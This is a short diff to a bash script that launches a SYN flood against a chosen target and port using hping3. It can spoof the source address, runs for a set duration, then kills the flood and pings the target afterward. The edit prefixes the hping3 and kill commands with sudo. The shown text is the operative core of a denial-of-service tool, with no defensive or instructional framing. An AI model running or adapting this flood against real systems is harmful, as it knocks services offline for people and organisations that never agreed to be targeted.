@@ -104,10 +104,10 @@ echo ""
 echo -e "${MAGENTA}[>] Launching SYN flood against ${RED}$TARGET:$PORT${MAGENTA} for ${CYAN}${DURATION}s${MAGENTA}...${RESET}"
 echo ""
 
-hping3 -S --flood -p "$PORT" $SPOOF_FLAG "$TARGET" &
+sudo hping3 -S --flood -p "$PORT" $SPOOF_FLAG "$TARGET" &
 HPING_PID=$!
 sleep "$DURATION"
-kill $HPING_PID 2>/dev/null
+sudo kill $HPING_PID
 
 # --- Post-attack ping ---
 echo ""
